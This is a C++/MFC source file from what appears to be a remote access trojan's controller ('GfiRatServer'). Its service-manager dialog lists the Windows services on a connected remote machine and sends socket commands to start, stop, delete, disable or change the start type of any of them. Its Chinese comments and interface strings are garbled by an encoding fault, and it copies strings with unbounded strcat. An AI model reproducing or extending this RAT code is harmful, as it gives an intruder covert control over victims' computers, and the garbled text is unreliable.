// SystemDlg.cpp : implementation file
//

#include "pch.h"
#include "GfiRatServer.h"
#include "SerAttribute.h"
#include "SerManager.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

enum
{
	COMMAND_SSLIST = 1,				// �����б�
	COMMAND_STARTSERVERICE,			// ��������
	COMMAND_STOPSERVERICE,			// ֹͣ����
	COMMAND_DELETESERVERICE,		// ɾ������
	COMMAND_CREATSERVERICE,			// ��������
	COMMAND_AUTOSERVERICE,			// ������
	COMMAND_HANDSERVERICE,			// �ֶ�
	COMMAND_DISABLESERVERICE		// ��ֹ
};

/////////////////////////////////////////////////////////////////////////////
// CSerManager dialog

CSerManager::CSerManager(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext* pContext)
	: CDialog(CSerManager::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSerManager)
	//}}AFX_DATA_INIT
	Sleep(100);
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SERT));  //����ͼ��
}


void CSerManager::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSerManager)
	DDX_Control(pDX, IDC_LIST_SERVER, m_list_server);
	//}}AFX_DATA_MAP
}

void CSerManager::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_SSLIST:
		ShowServiceList();
		break;
	default:
		// ���䷢���쳣����
		break;
	}
}

BEGIN_MESSAGE_MAP(CSerManager, CDialog)
	//{{AFX_MSG_MAP(CSerManager)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_LIST_PROCESS, OnRclickList)
	ON_COMMAND(ID_MENU_REF, OnMenuRef)
	ON_COMMAND(ID_MENU_START, OnMenuStart)
	ON_COMMAND(ID_MENU_STOP, OnMenuStop)
	ON_COMMAND(ID_MENU_DEL, OnMenuDel)
	ON_COMMAND(ID_MENU_CREATE, OnMenuCreate)
	ON_COMMAND(ID_MENU_START_AUTO, OnMenuStartAuto)
	ON_COMMAND(ID_MENU_START_MANAGER, OnMenuStartManager)
	ON_COMMAND(ID_MENU_START_DISABLE, OnMenuStartDisable)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_WINDOWS, OnRclickList)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_SERVER, OnRclickList)
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_SERVER, OnDblclkListServer)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSerManager message handlers
void CSerManager::ShowServiceList()
{
	char* lpBuffer = (char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	char* DisplayName;
	char* Description;
	char* ServiceName;
	char* StartType;
	char* ServiceState;
	char* BinaryPathName;
	DWORD	dwOffset = 0;
	m_list_server.DeleteAllItems();

	char stmk;
	Sleep(100);
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		DisplayName = lpBuffer + dwOffset;
		Description = DisplayName + lstrlen(DisplayName) + 1;
		ServiceName = Description + lstrlen(Description) + 1;
		StartType = ServiceName + lstrlen(ServiceName) + 1;
		ServiceState = StartType + lstrlen(StartType) + 1;
		BinaryPathName = ServiceState + lstrlen(ServiceState) + 1;

		if (!strcmp(StartType, "����"))
			stmk = 1;
		else if (!strcmp(ServiceState, "����"))
			stmk = 0;
		else
			stmk = 2;

		m_list_server.InsertItem(i, DisplayName, stmk);
		m_list_server.SetItemText(i, 1, Description);
		m_list_server.SetItemText(i, 2, ServiceName);
		m_list_server.SetItemText(i, 3, StartType);
		m_list_server.SetItemText(i, 4, ServiceState);
		m_list_server.SetItemText(i, 5, BinaryPathName);

		dwOffset += lstrlen(DisplayName) + 1 +
			lstrlen(Description) + 1 +
			lstrlen(ServiceName) + 1 +
			lstrlen(StartType) + 1 +
			lstrlen(ServiceState) + 1 +
			lstrlen(BinaryPathName) + 1;
	}
}

BOOL CSerManager::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - �������", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);

	//	m_tab.InsertItem(0, "�������");

	m_list_server.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES);
	m_list_server.InsertColumn(0, "��ʾ����", LVCFMT_LEFT, 220);
	m_list_server.InsertColumn(1, "����", LVCFMT_LEFT, 360);
	m_list_server.InsertColumn(2, "��������", LVCFMT_LEFT, 100);
	m_list_server.InsertColumn(3, "����", LVCFMT_LEFT, 60);
	m_list_server.InsertColumn(4, "״̬", LVCFMT_LEFT, 60);
	m_list_server.InsertColumn(5, "�ļ�·��", LVCFMT_LEFT, 300);

	m_ImgList.Create(16, 16, ILC_COLOR8 | ILC_MASK, 15, 1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICONSERT0));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICONSERT1));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICONSERT2));
	m_list_server.SetImageList(&m_ImgList, LVSIL_SMALL);

	AdjustList();
	//	m_list_server.ShowWindow(SW_SHOW);
	//	OnShowWindow(0);
	//	Sleep(1000);
	ShowServiceList();

	return TRUE;  // return TRUE unless you set the focus to a control
				  // EXCEPTION: OCX Property Pages should return FALSE
}


BOOL CSerManager::PreTranslateMessage(MSG* pMsg)
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CSerManager::OnClose()
{
	// TODO: Add your message handler code here and/or call default
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	DestroyWindow();
}

void CSerManager::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	AdjustList();
}

void CSerManager::AdjustList()
{
	RECT	rectClient;
	RECT	rectList;
	if (!m_list_server.GetSafeHwnd())
		return;
	GetClientRect(&rectClient);
	rectList.left = 0;
	rectList.top = 0;
	rectList.right = rectClient.right;
	rectList.bottom = rectClient.bottom;
	m_list_server.MoveWindow(&rectList);
}


void CSerManager::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
//	if (m_list_server.IsWindowVisible())
//	{
	CMenu	popup;
	popup.LoadMenu(IDR_SLIST1);
	CMenu* pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);

		pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);//�������û���Ҽ�ͼ��
	//pM->TrackPopupMenu(pM, TPM_RIGHTBUTTON, p.x, p.y, this);
	*pResult = 0;
	//	}
}


void CSerManager::GetServiceList()
{
	BYTE bToken = COMMAND_SSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSerManager::OnMenuRef()
{
	GetServiceList();
}

void CSerManager::OnMenuStart()
{
	CString		tSerName;
	char		sername[300] = "\0";

	int		nItem = m_list_server.GetNextItem(-1, LVNI_SELECTED);
	tSerName = m_list_server.GetItemText(nItem, 2);
	ZeroMemory(sername, sizeof(sername));
	strcat(sername, tSerName);

	int nPacketLength = (strlen(sername) + 1);;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpBuffer[0] = COMMAND_STARTSERVERICE;

	memcpy(lpBuffer + 1, &sername, strlen(sername));
	/*
		char ch = *lpBuffer;
		char *tem = &ch;
		OutputDebugString(tem);
	*/
	m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);
	//	delete [] lpBuffer;
	LocalFree(lpBuffer);
}

void CSerManager::OnMenuStop()
{
	CString		tSerName;
	char		sername[300] = "\0";

	int		nItem = m_list_server.GetNextItem(-1, LVNI_SELECTED);
	tSerName = m_list_server.GetItemText(nItem, 2);
	ZeroMemory(sername, sizeof(sername));
	strcat(sername, tSerName);//��ȡ������

	int nPacketLength = (strlen(sername) + 1);;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpBuffer[0] = COMMAND_STOPSERVERICE;

	memcpy(lpBuffer + 1, &sername, strlen(sername));

	m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);
	//	delete [] lpBuffer;
	LocalFree(lpBuffer);
}

void CSerManager::OnMenuDel()
{
	CString		tSerName;
	char		sername[300] = "\0";

	int		nItem = m_list_server.GetNextItem(-1, LVNI_SELECTED);
	tSerName = m_list_server.GetItemText(nItem, 2);
	ZeroMemory(sername, sizeof(sername));
	strcat(sername, tSerName);//��ȡ������

	int nPacketLength = (strlen(sername) + 1);;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpBuffer[0] = COMMAND_DELETESERVERICE;

	memcpy(lpBuffer + 1, &sername, strlen(sername));

	m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);
	//	delete [] lpBuffer;
	LocalFree(lpBuffer);
}

void CSerManager::OnMenuCreate()
{

}

void CSerManager::OnMenuStartAuto()
{
	CString		tSerName;
	char		sername[300] = "\0";
	int		nItem = m_list_server.GetNextItem(-1, LVNI_SELECTED);
	tSerName = m_list_server.GetItemText(nItem, 2);
	ZeroMemory(sername, sizeof(sername));
	strcat(sername, tSerName);//��ȡ������
	int nPacketLength = (strlen(sername) + 1);;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpBuffer[0] = COMMAND_AUTOSERVERICE;

	memcpy(lpBuffer + 1, &sername, strlen(sername));

	m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);
	//	delete [] lpBuffer;
	LocalFree(lpBuffer);
}

void CSerManager::OnMenuStartManager()
{
	CString		tSerName;
	char		sername[300] = "\0";

	int		nItem = m_list_server.GetNextItem(-1, LVNI_SELECTED);
	tSerName = m_list_server.GetItemText(nItem, 2);
	ZeroMemory(sername, sizeof(sername));
	strcat(sername, tSerName);//��ȡ������

	int nPacketLength = (strlen(sername) + 1);;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpBuffer[0] = COMMAND_HANDSERVERICE;

	memcpy(lpBuffer + 1, &sername, strlen(sername));

	m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);
	//	delete [] lpBuffer;
	LocalFree(lpBuffer);
}

void CSerManager::OnMenuStartDisable()
{
	CString		tSerName;
	char		sername[300] = "\0";

	int		nItem = m_list_server.GetNextItem(-1, LVNI_SELECTED);
	tSerName = m_list_server.GetItemText(nItem, 2);
	ZeroMemory(sername, sizeof(sername));
	strcat(sername, tSerName);//��ȡ������

	int nPacketLength = (strlen(sername) + 1);;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpBuffer[0] = COMMAND_DISABLESERVERICE;

	memcpy(lpBuffer + 1, &sername, strlen(sername));

	m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);
	//	delete [] lpBuffer;
	LocalFree(lpBuffer);
}

void CSerManager::PostNcDestroy()
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
	CDialog::PostNcDestroy();
}

void CSerManager::OnDblclkListServer(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	CSerAttribute SerAttribute(this, &m_list_server);
	SerAttribute.DoModal();

	*pResult = 0;
}
